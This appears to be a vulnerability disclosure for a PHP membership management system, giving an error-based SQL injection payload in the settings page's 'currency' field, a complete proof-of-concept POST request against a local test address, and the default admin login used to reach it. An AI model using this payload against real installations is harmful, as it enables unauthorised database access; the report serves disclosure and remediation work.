# SQLi-2

# Vulnerability Description

The membership-management-system in PHP Free Source Code (It is an open source project from [https://codeastro.com/](https://codeastro.com/)) has SQL injection vulnerabilities, which can lead to database information leakage.

1. BUG_Author:  GaoJiaDong
2. vendors: https://codeastro.com/membership-management-system-in-php-with-source-code/;
3. The program is built using the PHP 7.3.4nts version;
4. Vulnerability location: /settings.php

# Vulnerability Verification

[+] Payload:

```http
$'and/**/extractvalue(1,concat(char(126),user()))and'
```

POC：

```http
POST http://192.168.10.108/membership/settings.php HTTP/1.1
Host: 192.168.10.108
Content-Length: 551
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
Origin: http://192.168.10.108
Content-Type: multipart/form-data; boundary=----WebKitFormBoundarykDL01BGLdaAAiTIL
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36 Edg/122.0.0.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Referer: http://192.168.10.108/membership/settings.php
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Cookie: PHPSESSID=vh18091oo0f1meordh3s83hkfp
Connection: close

------WebKitFormBoundarykDL01BGLdaAAiTIL
Content-Disposition: form-data; name="systemName"

Membership System
------WebKitFormBoundarykDL01BGLdaAAiTIL
Content-Disposition: form-data; name="logo"; filename=""
Content-Type: application/octet-stream


------WebKitFormBoundarykDL01BGLdaAAiTIL
Content-Disposition: form-data; name="currency"

$'and/**/extractvalue(1,concat(char(126),user()))and'
------WebKitFormBoundarykDL01BGLdaAAiTIL
Content-Disposition: form-data; name="updateSettings"


------WebKitFormBoundarykDL01BGLdaAAiTIL--

```

## How to verify

1.Build the vulnerability environment according to the steps provided by the source code author ;

2.login to the "Admin Panel” through the default account and password（Email: [admin@mail.com](mailto:admin@mail.com) Password: codeastro.com）;

3.The vulnerability is located at the "Settings-Update Settings" function, you should inserts Payload when you Update any  information，as shown in the following figure：

​![image](assets/image-20240227214116-80ly2bi.png)​

​![image](assets/image-20240227214234-31512eo.png)​
